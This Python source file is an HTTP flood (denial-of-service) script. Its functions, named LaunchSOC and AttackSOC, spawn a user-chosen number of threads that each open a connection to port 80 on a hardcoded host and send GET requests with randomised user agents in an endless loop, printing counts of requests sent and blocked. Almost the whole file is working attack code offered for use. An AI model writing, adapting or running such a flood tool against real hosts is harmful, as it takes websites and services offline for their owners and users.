import random
import socket
import threading
import socks
from colorama import Fore, init

port = 80
rs = 0
closed = 0
red = 255, 0, 0
closed = 0

def LaunchSOC(th):
    req = "GET " + '/' + " HTTP/1.1\r\nHost: " + host + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    print(req)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(req,))
            thd.start()
            print("" + Fore.LIGHTBLACK_EX + thd.name)
        except:
            pass


def AttackSOC(req):
    global rs, closed, thd, closed
    s = socks.socksocket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((str(host), int(80)))
    while True:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    rs = rs + 1
                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed}" + Fore.RESET + "", end='\r')
            except:
                closed = closed + 1
                s.close()
        except:
            pass
# socks.set_default_proxy()

if __name__ == '__main__':
    # host = input("HTTP Host: ")
    host = 'www.ddosfilter.net'
    th = int(input("Threads: "))
    ua = open('./ua.txt', 'r').read().split('\n')
    LaunchSOC(th)
